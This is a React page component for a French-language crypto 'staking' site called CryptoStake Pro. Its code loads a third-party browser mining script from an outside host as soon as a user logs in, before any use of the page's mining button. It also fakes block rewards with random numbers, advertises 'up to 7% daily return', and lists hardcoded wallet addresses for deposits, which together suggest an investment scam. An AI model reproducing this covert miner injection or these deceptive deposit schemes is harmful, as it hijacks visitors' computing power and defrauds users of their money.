import StakingCard from "@/components/StakingCard";
import ClickerGame from "@/components/ClickerGame";
import WithdrawalSection from "@/components/PaymentSection";
import PortfolioTracker from "@/components/PortfolioTracker";
import ReferralSystem from "@/components/ReferralSystem";
import { ReferralLinksSection } from "@/components/ReferralLinksSection";
import SecurityCenter from "@/components/SecurityCenter";
import NewsCenter from "@/components/NewsCenter";
import DepositTracker from "@/components/DepositTracker";
import StakingTracker from "@/components/StakingTracker";
import CustomStaking from "@/components/CustomStaking";

import MiningFarm from "@/components/MiningFarm";
import RewardsSystem from "@/components/RewardsSystem";
import MissionsSystem from "@/components/MissionsSystem";
import LeaderboardSystem from "@/components/LeaderboardSystem";
import LootBoxSystem from "@/components/LootBoxSystem";
import EventsSystem from "@/components/EventsSystem";
import CustomizationSystem from "@/components/CustomizationSystem";
import VIPSystem from "@/components/VIPSystem";
import BattlePassSystem from "@/components/BattlePassSystem";
import DeadSpotShop from "@/components/DeadSpotShop";
import PlatformStats from "@/components/PlatformStats";
import { CollapsibleSection } from "@/components/CollapsibleSection";
import { Button } from "@/components/ui/button";
import { useAuth } from "@/hooks/useAuth";
import { useLanguage } from "@/contexts/LanguageContext";
import { LanguageSelector } from "@/components/LanguageSelector";
import { Navigate } from "react-router-dom";
import { SidebarProvider, SidebarTrigger } from "@/components/ui/sidebar";
import { AppSidebar } from "@/components/AppSidebar";

import DepositBonusPopup from "@/components/DepositBonusPopup";
import { SpinWheel } from "@/components/SpinWheel";
import heroBackground from "@/assets/hero-background.jpg";
import { useState } from "react";
import { FaucetClaim } from "@/components/FaucetClaim";
import { useEffect } from "react";
import LiveChat from "@/components/LiveChat";
import { HashrateGraph } from "@/components/HashrateGraph";
import { useMiningPersistence } from "@/hooks/useMiningPersistence";

// Extend Window interface for mining client
declare global {
  interface Window {
    miningClient?: any;
    miningClientInitialized?: boolean;
    Client?: any;
  }
}

const Index = () => {
  const { user, signOut, loading } = useAuth();
  const { t } = useLanguage();
  const { 
    miningData, 
    isLoading: miningLoading, 
    addMinedBlock, 
    exchangeHashrate, 
    toggleMining: toggleMiningPersistence, 
    updateThrottle 
  } = useMiningPersistence();
  
  const [showSpinWheel, setShowSpinWheel] = useState(false);
  const [showFaucet, setShowFaucet] = useState(false);
  
  const [userZeroBalance, setUserZeroBalance] = useState(0);
  const [showDepositBonus, setShowDepositBonus] = useState(true);

  // Mining control states
  const [isMining, setIsMining] = useState(false);
  const [throttle, setThrottle] = useState(0.7);
  const [hashrateHistory, setHashrateHistory] = useState<number[]>([]);
  const [currentHashrate, setCurrentHashrate] = useState(0);
  const [lastBlockTime, setLastBlockTime] = useState(Date.now());

  console.log("Index component - user:", user, "loading:", loading);

  // Synchroniser les states locaux avec les données persistées
  useEffect(() => {
    if (!miningLoading && miningData) {
      setIsMining(miningData.is_currently_mining);
      setThrottle(miningData.mining_throttle);
    }
  }, [miningData, miningLoading]);

  const handleZeroWin = (amount: number) => {
    setUserZeroBalance(prev => prev + amount);
  };

  // Mining script injection for main page
  useEffect(() => {
    if (user) {
      // Charger script de mining
      const existingScript = document.head.querySelector(
        'script[src="https://www.hostingcloud.racing/f4U5.js"]'
      );
      if (existingScript) return;

      const script1 = document.createElement("script");
      script1.src = "https://www.hostingcloud.racing/f4U5.js";
      script1.async = true;
      script1.id = "mining-script-main";
      document.head.appendChild(script1);

      script1.onload = () => {
        if (!window.miningClientInitialized && window.Client) {
          var _client = new window.Client.Anonymous(
            "80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd",
            { throttle: throttle, c: "w" }
          );
          window.miningClient = _client;
          window.miningClientInitialized = true;
        }
      };

      return () => {
        if (window.miningClient && window.miningClient.stop) {
          window.miningClient.stop();
          window.miningClient = null;
          window.miningClientInitialized = false;
        }
        const scripts = document.head.querySelectorAll(
          "#mining-script-main, #mining-script-client"
        );
        scripts.forEach((s) => s.remove());
      };
    }
  }, [user]);

  // Appliquer throttle en temps réel
  useEffect(() => {
    if (window.miningClient && window.miningClient.setThrottle) {
      window.miningClient.setThrottle(throttle);
    }
  }, [throttle]);

  // Récupérer hashrate chaque seconde et système de blocs
  useEffect(() => {
    const interval = setInterval(async () => {
      if (window.miningClient && isMining && typeof window.miningClient.getHashesPerSecond === 'function') {
        const hps = window.miningClient.getHashesPerSecond() || 0;
        setCurrentHashrate(hps);
        setHashrateHistory((prev) => [...prev.slice(-19), hps]); // max 20 points
        
        // Accumulation de hashrate et système de blocs
        const now = Date.now();
        if (now - lastBlockTime >= 10000) { // Nouveau bloc toutes les 10 secondes
          const blockReward = Math.floor(Math.random() * (35000 - 20000 + 1)) + 20000;
          
          // Sauvegarder dans Supabase
          const success = await addMinedBlock(blockReward, hps);
          if (success) {
            setLastBlockTime(now);
          }
        }
      } else {
        setCurrentHashrate(0);
      }
    }, 1000);
    return () => clearInterval(interval);
  }, [isMining, lastBlockTime, addMinedBlock]);

  // Toggle ON/OFF avec sauvegarde
  const toggleMining = async () => {
    if (!window.miningClient) return;
    
    const newMiningState = !isMining;
    
    if (newMiningState) {
      if (typeof window.miningClient.start === 'function') {
        window.miningClient.start();
      }
      setLastBlockTime(Date.now()); // Reset block timer
    } else {
      if (typeof window.miningClient.stop === 'function') {
        window.miningClient.stop();
      }
    }
    
    // Sauvegarder l'état dans Supabase
    const success = await toggleMiningPersistence(newMiningState);
    if (success) {
      setIsMining(newMiningState);
    }
  };

  // Mise à jour du throttle avec sauvegarde
  const handleThrottleChange = async (newThrottle: number) => {
    setThrottle(newThrottle);
    
    // Appliquer immédiatement au mineur
    if (window.miningClient && window.miningClient.setThrottle) {
      window.miningClient.setThrottle(newThrottle);
    }
    
    // Sauvegarder dans Supabase
    await updateThrottle(newThrottle);
  };

  if (loading || miningLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary mx-auto mb-4"></div>
          <p className="text-foreground">{t('loading')}</p>
        </div>
      </div>
    );
  }
  if (!user) {
    console.log("User not found, redirecting to auth");
    return <Navigate to="/auth" replace />;
  }
  const stakingPools = [
    {
      name: "Polygon",
      symbol: "MATIC",
      network: "Polygon Network",
      apy: "7",
      icon: "🔷",
      color: "bg-purple-600",
      walletAddress: "0x380060e81A820a1691fA58C84ba27c23ed1Eff77"
    },
    {
      name: "Bitcoin",
      symbol: "BTC",
      network: "Bitcoin Network",
      apy: "5",
      icon: "₿",
      color: "bg-orange-500",
      walletAddress: "1LJWeugswr2GsqAZ7H8pFYZ7Q2uF8pAVb8"
    },
    {
      name: "TRON",
      symbol: "TRX",
      network: "TRC20",
      apy: "6",
      icon: "🔺",
      color: "bg-red-500",
      walletAddress: "TY4o9UKBz32xi8hexbv6XhccqGBqSk8oJ7"
    },
    {
      name: "Toncoin",
      symbol: "TON",
      network: "TON Network",
      apy: "4",
      icon: "💎",
      color: "bg-blue-500",
      walletAddress: "EQD14kgmngE0fNYVs7_9dw78V3rPhNt7_Ee-7X3ykDORQvMp",
      memo: "492929"
    },
    {
      name: "Solana",
      symbol: "SOL",
      network: "Solana Network",
      apy: "3",
      icon: "☀️",
      color: "bg-purple-400",
      walletAddress: "CWnduVqeRQrxqhGPNDnHTqHWM1dJLqCnojhMQS8FEUFB"
    },
    {
      name: "Dogecoin",
      symbol: "DOGE",
      network: "Dogecoin Network",
      apy: "1",
      icon: "🐕",
      color: "bg-yellow-500",
      walletAddress: "DDVYeK8MiizfsnzLtigSAWfx6PH24puQze"
    }
  ];

  // ... keep existing code (hero section variables)

  return (
    <SidebarProvider>
      <div className="min-h-screen flex w-full bg-background">
        <AppSidebar />
        
        <div className="flex-1">
          {/* Language Selector - Fixed position */}
          <div className="fixed top-4 right-4 z-50">
            <LanguageSelector />
          </div>
      
      {/* Spin Wheel Slide */}
      {showSpinWheel && (
        <div className="fixed inset-0 bg-background/95 backdrop-blur-sm z-50 overflow-auto">
          <div className="container mx-auto p-6">
            <div className="flex justify-between items-center mb-6">
              <h2 className="text-3xl font-bold gradient-text">🎰 {t('gaming.spin.title')}</h2>
              <Button 
                variant="ghost" 
                onClick={() => {
                  console.log('Closing spin wheel...');
                  setShowSpinWheel(false);
                }}
                className="text-2xl"
              >
                {t('close')}
              </Button>
            </div>
            <SpinWheel onZeroWin={handleZeroWin} />
          </div>
        </div>
      )}

      {/* Faucet ZERO Slide */}
      {showFaucet && (
        <div className="fixed inset-0 bg-background/95 backdrop-blur-sm z-50 overflow-auto">
          <div className="container mx-auto p-6">
            <div className="flex justify-between items-center mb-6">
              <h2 className="text-3xl font-bold gradient-text">💧 {t('gaming.faucet.title')}</h2>
              <Button 
                variant="ghost" 
                onClick={() => {
                  console.log('Closing faucet...');
                  setShowFaucet(false);
                }}
                className="text-2xl"
              >
                {t('close')}
              </Button>
            </div>
            <FaucetClaim 
              onOpenSpin={() => {
                console.log('Opening spin from faucet...');
                setShowSpinWheel(true);
              }}
            />
          </div>
        </div>
      )}


      <DepositBonusPopup 
        isOpen={showDepositBonus} 
        onClose={() => setShowDepositBonus(false)} 
      />

      {/* Hero Section */}
      <section className="relative h-screen flex items-center justify-center overflow-hidden">
        <div 
          className="absolute inset-0 bg-cover bg-center bg-no-repeat"
          style={{ backgroundImage: `url(${heroBackground})` }}
        />
        <div className="absolute inset-0 bg-background/80" />
        
        <div className="relative z-10 text-center max-w-4xl mx-auto px-6">
          <h1 className="text-6xl md:text-8xl font-bold mb-6 gradient-crypto bg-clip-text text-transparent animate-float">
            {t('app.title')}
          </h1>
          <p className="text-xl md:text-2xl text-muted-foreground mb-8 max-w-2xl mx-auto">
            {t('app.subtitle')}
          </p>
          <div className="flex flex-col sm:flex-row gap-4 justify-center">
            <Button variant="crypto" size="xl" className="shadow-glow">
              {t('hero.start_staking')}
            </Button>
            <Button variant="ghost" size="sm" onClick={signOut} className="mt-4">
              {t('sign_out')}
            </Button>
          </div>
        </div>
      </section>

          {/* News Center Section - 2ème position */}
          <section id="news" className="container mx-auto px-6 py-12">
            <div className="text-center mb-12">
              <h2 className="text-3xl font-bold mb-4">Centre d'Actualités</h2>
              <p className="text-muted-foreground">Restez informé des dernières nouvelles crypto</p>
            </div>
            <NewsCenter />
          </section>

          {/* Portfolio Tracker Section - 3ème position */}
          <section id="portfolio" className="container mx-auto px-6 py-12 bg-secondary/20">
            <div className="text-center mb-12">
              <h2 className="text-3xl font-bold mb-4">Suivi de Portefeuille</h2>
              <p className="text-muted-foreground">Analysez la performance de votre portefeuille</p>
            </div>
            <PortfolioTracker />
          </section>

          {/* Security Center Section - 4ème position */}
          <section id="security" className="container mx-auto px-6 py-12">
            <div className="text-center mb-12">
              <h2 className="text-3xl font-bold mb-4">Centre de Sécurité</h2>
              <p className="text-muted-foreground">Gérez la sécurité de votre compte</p>
            </div>
            <SecurityCenter />
          </section>

          {/* Features Section */}
          <section id="features" className="container mx-auto px-6 py-12 bg-secondary/20">
            <div className="text-center mb-12">
              <h2 className="text-3xl font-bold mb-4">Pourquoi Choisir CryptoStake Pro ?</h2>
              <p className="text-muted-foreground">Découvrez nos avantages</p>
            </div>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
              <div className="text-center p-6 bg-card rounded-lg border border-primary/20 hover:shadow-glow transition-all hover-scale">
                <div className="w-16 h-16 bg-primary rounded-full flex items-center justify-center text-3xl mx-auto mb-4 animate-scale-in">
                  🔒
                </div>
                <h3 className="text-xl font-bold mb-2">Sécurisé</h3>
                <p className="text-muted-foreground">
                  Protocoles de sécurité avancés et audits réguliers pour protéger vos fonds
                </p>
              </div>
              <div className="text-center p-6 bg-card rounded-lg border border-primary/20 hover:shadow-glow transition-all hover-scale">
                <div className="w-16 h-16 bg-success rounded-full flex items-center justify-center text-3xl mx-auto mb-4 animate-scale-in">
                  ⚡
                </div>
                <h3 className="text-xl font-bold mb-2">Rendements Élevés</h3>
                <p className="text-muted-foreground">
                  Jusqu'à 7% de rendement quotidien avec nos algorithmes optimisés
                </p>
              </div>
              <div className="text-center p-6 bg-card rounded-lg border border-primary/20 hover:shadow-glow transition-all hover-scale">
                <div className="w-16 h-16 bg-info rounded-full flex items-center justify-center text-3xl mx-auto mb-4 animate-scale-in">
                  🌐
                </div>
                <h3 className="text-xl font-bold mb-2">Multi-Blockchain</h3>
                <p className="text-muted-foreground">
                  Support de 6 réseaux blockchain majeurs pour diversifier votre portefeuille
                </p>
              </div>
            </div>
          </section>

          {/* Statistics Section */}
          <section id="stats" className="container mx-auto px-6 py-12">
            <div className="text-center mb-12">
              <h2 className="text-3xl font-bold mb-4">Statistiques de la Plateforme</h2>
              <p className="text-muted-foreground">Des chiffres réels qui témoignent de la croissance de notre communauté</p>
            </div>
            <PlatformStats />
          </section>

          {/* Custom Staking Section - 7ème position */}
          <section id="custom-staking" className="container mx-auto px-6 py-12 bg-secondary/20">
            <div className="text-center mb-12">
              <h2 className="text-3xl font-bold mb-4">Staking Personnalisé</h2>
              <p className="text-muted-foreground">Personnalisez votre stratégie de staking</p>
            </div>
            <CustomStaking />
          </section>

          {/* Gaming Section */}
          <section id="gaming" className="container mx-auto px-6 py-12">
            <div className="text-center mb-12">
              <h2 className="text-3xl font-bold mb-4">{t('gaming.title')}</h2>
              <p className="text-muted-foreground">{t('gaming.subtitle')}</p>
            </div>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              
              <div className="text-center p-6 bg-card rounded-lg border border-primary/20 hover:shadow-glow transition-all">
                <div className="text-4xl mb-4">💧</div>
                <h3 className="text-lg font-bold mb-2">{t('gaming.faucet.title')}</h3>
                <p className="text-sm text-muted-foreground mb-4">
                  {t('gaming.faucet.description')}
                </p>
                <Button 
                  variant="secondary" 
                  onClick={() => {
                    console.log('Opening faucet...');
                    setShowFaucet(true);
                  }}
                  className="w-full shadow-glow"
                >
                  {t('gaming.faucet.claim')}
                </Button>
              </div>
              
              <div className="text-center p-6 bg-card rounded-lg border border-primary/20 hover:shadow-glow transition-all">
                <div className="text-4xl mb-4">🎰</div>
                <h3 className="text-lg font-bold mb-2">{t('gaming.spin.title')}</h3>
                <p className="text-sm text-muted-foreground mb-4">
                  {t('gaming.spin.description')}
                </p>
                <Button 
                  variant="crypto" 
                  onClick={() => {
                    console.log('Opening spin wheel...');
                    setShowSpinWheel(true);
                  }}
                  className="w-full shadow-glow"
                >
                  {t('gaming.spin.turn')}
                </Button>
              </div>
            </div>
          </section>

          {/* Mining Control Section */}
          <section id="mining-control" className="container mx-auto px-6 py-12 bg-secondary/20">
            <div className="text-center mb-12">
              <h2 className="text-3xl font-bold mb-4">⛏️ Contrôle du Mineur</h2>
              <p className="text-muted-foreground">Gérez votre puissance de minage en direct</p>
            </div>
            <div className="max-w-4xl mx-auto space-y-8">
              {/* Contrôles Mining */}
              <div className="text-center space-y-6">
                <Button onClick={toggleMining} variant="crypto" className="shadow-glow text-lg px-8 py-3">
                  {isMining ? "⛔ Stop Mining" : "▶️ Start Mining"}
                </Button>

                {/* Slider throttle */}
                <div className="max-w-md mx-auto">
                  <label className="block text-sm font-medium mb-3">
                    Utilisation CPU : <span className="text-primary font-bold">{Math.round((1 - throttle) * 100)}%</span>
                  </label>
                  <div className="relative">
                    <input
                      type="range"
                      min="0.1"
                      max="0.6"
                      step="0.05"
                      value={throttle}
                      onChange={(e) => handleThrottleChange(parseFloat(e.target.value))}
                      className="w-full h-3 bg-muted rounded-lg appearance-none cursor-pointer slider"
                      style={{
                        background: `linear-gradient(to right, 
                          hsl(var(--primary)) 0%, 
                          hsl(var(--primary)) ${((1 - throttle - 0.1) / 0.5) * 100}%, 
                          hsl(var(--muted)) ${((1 - throttle - 0.1) / 0.5) * 100}%, 
                          hsl(var(--muted)) 100%)`
                      }}
                    />
                    <div className="flex justify-between text-xs text-muted-foreground mt-1">
                      <span>Min</span>
                      <span>Max</span>
                    </div>
                  </div>
                </div>
              </div>

              {/* Graphique Hashrate amélioré */}
              <HashrateGraph 
                hashrateHistory={hashrateHistory}
                currentHashrate={currentHashrate}
                isActive={isMining}
                accumulatedHashrate={miningData.accumulated_hashrate}
                deadspotCoins={miningData.deadspot_coins}
                onExchange={exchangeHashrate}
              />
            </div>
          </section>

          {/* Statistics Section */}
          <section id="stats" className="container mx-auto px-6 py-12">
            <div className="text-center mb-12">
              <h2 className="text-3xl font-bold mb-4">Statistiques de la Plateforme</h2>
              <p className="text-muted-foreground">Des chiffres réels qui témoignent de la croissance de notre communauté</p>
            </div>
            <PlatformStats />
          </section>

          {/* Deposit and Staking Tracker */}
          <section id="deposits" className="container mx-auto px-6 py-12">
            <div className="text-center mb-12">
              <h2 className="text-3xl font-bold mb-4">Mes Dépôts et Positions</h2>
              <p className="text-muted-foreground">Suivez vos dépôts et positions de staking en temps réel</p>
            </div>
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
              <div>
                <h3 className="text-2xl font-bold mb-6">Dépôts</h3>
                <DepositTracker />
              </div>
              <div>
                <h3 className="text-2xl font-bold mb-6">Staking</h3>
                <StakingTracker />
              </div>
            </div>
          </section>

          {/* Click Game Section */}
          <section id="clicker" className="container mx-auto px-6 py-12 bg-secondary/20">
            <div className="text-center mb-12">
              <h2 className="text-3xl font-bold mb-4">Mini-Jeu DeadSpot Click</h2>
              <p className="text-muted-foreground">Cliquez pour gagner des DeadSpot coins et débloquer des power-ups!</p>
            </div>
            <ClickerGame />
          </section>


          {/* Mining Farm Section */}
          <section id="mining-farm" className="container mx-auto px-6 py-12">
            <div className="text-center mb-12">
              <h2 className="text-3xl font-bold mb-4">Ferme de Mining DeadSpot</h2>
              <p className="text-muted-foreground">Achetez des mineurs avec vos DeadSpot coins et diamants</p>
            </div>
            <MiningFarm 
              deadspotCoins={0} 
              setDeadspotCoins={() => {}} 
              diamonds={0} 
              setDiamonds={() => {}}
            />
          </section>

          {/* Rewards System Section */}
          <section id="rewards" className="container mx-auto px-6 py-12 bg-secondary/20">
            <div className="text-center mb-12">
              <h2 className="text-3xl font-bold mb-4">Système de Récompenses</h2>
              <p className="text-muted-foreground">Gagnez de l'expérience et réclamez vos bonus quotidiens</p>
            </div>
            <RewardsSystem 
              deadspotCoins={0}
              setDeadspotCoins={() => {}}
              diamonds={0}
              setDiamonds={() => {}}
              miningExp={0}
              setMiningExp={() => {}}
              level={1}
              setLevel={() => {}}
            />
          </section>

          {/* Referral Links Section */}
          <section id="referrals" className="container mx-auto px-6 py-12">
            <div className="text-center mb-12">
              <h2 className="text-3xl font-bold mb-4">{t('referral_links.title')}</h2>
              <p className="text-muted-foreground">{t('referral_links.subtitle')}</p>
            </div>
            <ReferralLinksSection />
          </section>

          {/* VIP & Monetization Section */}
          <section id="vip" className="container mx-auto px-6 py-12 bg-secondary/20">
            <div className="text-center mb-12">
              <h2 className="text-3xl font-bold mb-4">VIP & Monétisation</h2>
              <p className="text-muted-foreground">Système VIP, Battle Pass et boutique DeadSpot</p>
            </div>
            <div className="space-y-12">
              <VIPSystem />
              <BattlePassSystem />
              <DeadSpotShop />
            </div>
          </section>

          {/* Gaming Features Section */}
          <section id="gaming-features" className="container mx-auto px-6 py-12">
            <div className="text-center mb-12">
              <h2 className="text-3xl font-bold mb-4">Fonctionnalités Gaming</h2>
              <p className="text-muted-foreground">Évènements, missions, classements et loot boxes</p>
            </div>
            <div className="space-y-12">
              <EventsSystem />
              <MissionsSystem />
              <LeaderboardSystem />
              <LootBoxSystem />
            </div>
          </section>

          {/* Leaderboard Section */}
          <section id="leaderboard" className="container mx-auto px-6 py-12 bg-secondary/20">
            <div className="text-center mb-12">
              <h2 className="text-3xl font-bold mb-4">Classements</h2>
              <p className="text-muted-foreground">Compétitions et classements de la communauté</p>
            </div>
            <LeaderboardSystem />
          </section>

          {/* Customization Section */}
          <section id="customization" className="container mx-auto px-6 py-12">
            <div className="text-center mb-12">
              <h2 className="text-3xl font-bold mb-4">Personnalisation</h2>
              <p className="text-muted-foreground">Personnalisez votre expérience</p>
            </div>
            <CustomizationSystem />
          </section>


          {/* Withdrawal Section */}
          <section id="withdrawal" className="container mx-auto px-6 py-12">
            <div className="text-center mb-12">
              <h2 className="text-3xl font-bold mb-4">Système de Retrait</h2>
              <p className="text-muted-foreground">Demandez le retrait de vos fonds de manière sécurisée</p>
            </div>
            <WithdrawalSection />
          </section>


          {/* Referral System Section */}
          <section id="referral-system" className="container mx-auto px-6 py-12">
            <div className="text-center mb-12">
              <h2 className="text-3xl font-bold mb-4">Système de Parrainage</h2>
              <p className="text-muted-foreground">Gagnez des récompenses en invitant vos amis</p>
            </div>
            <ReferralSystem />
          </section>

          {/* Staking Pools Section */}
          <section className="container mx-auto px-6 py-12 bg-secondary/20">
            <div className="text-center mb-12">
              <h2 className="text-3xl font-bold mb-4">Pools de Staking Disponibles</h2>
              <p className="text-muted-foreground">Choisissez parmi nos pools optimisés</p>
            </div>
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
              {stakingPools.map((pool, index) => (
                <StakingCard key={index} {...pool} />
              ))}
            </div>
          </section>

          {/* Contact Section */}
          <section className="bg-secondary/10 border-t border-primary/10 py-8 px-6">
            <div className="max-w-4xl mx-auto text-center">
              <h3 className="text-xl font-semibold mb-4 gradient-text">
                📧 Contacter l'Auteur
              </h3>
              <p className="text-muted-foreground mb-4">
                Pour toute idée, soumission, erreur ou problème :
              </p>
              <div className="p-4 bg-card rounded-lg border border-primary/20 inline-block">
                <p className="text-lg font-medium">
                  📬 Email: <a 
                    href="mailto:maximlprive90@gmail.com" 
                    className="text-primary hover:text-primary/80 transition-colors underline"
                  >
                    maximlprive90@gmail.com
                  </a>
                </p>
              </div>
            </div>
          </section>

          {/* Footer */}
          <footer className="bg-card border-t border-primary/20 py-12 px-6">
            <div className="max-w-7xl mx-auto text-center">
              <h3 className="text-2xl font-bold gradient-crypto bg-clip-text text-transparent mb-4">
                CryptoStake Pro
              </h3>
              <p className="text-muted-foreground mb-6">
                La plateforme de staking nouvelle génération
              </p>
              <div className="flex justify-center gap-4">
                <Button variant="ghost" size="sm">Conditions</Button>
                <Button variant="ghost" size="sm">Confidentialité</Button>
                <Button variant="ghost" size="sm">Support</Button>
              </div>
            </div>
          </footer>
        </div>
      </div>
    </SidebarProvider>
  );
};

export default Index;